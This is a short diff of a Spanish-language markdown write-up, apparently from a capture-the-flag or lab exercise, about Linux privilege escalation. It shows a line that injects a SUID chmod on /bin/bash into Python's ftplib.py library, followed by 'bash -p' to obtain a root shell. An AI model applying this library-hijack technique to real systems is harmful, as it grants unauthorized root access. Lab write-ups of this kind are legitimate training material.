@@ -858,3 +858,8 @@ echo 'os.system("chmod u+s /bin/bash")' >> /usr/lib/python2.7/ftplib.py
 si hacemos un `cat` del archivo podemos ver que hemos agregado la linea para cambiar los permisos de la bash al final de la librería
 ![[Pasted image 20240622213510.png]]
 
+`bash -p`
+de esta manera logramos ser root
+![[Pasted image 20240622213815.png]]
+
+### WE ARE ROOT
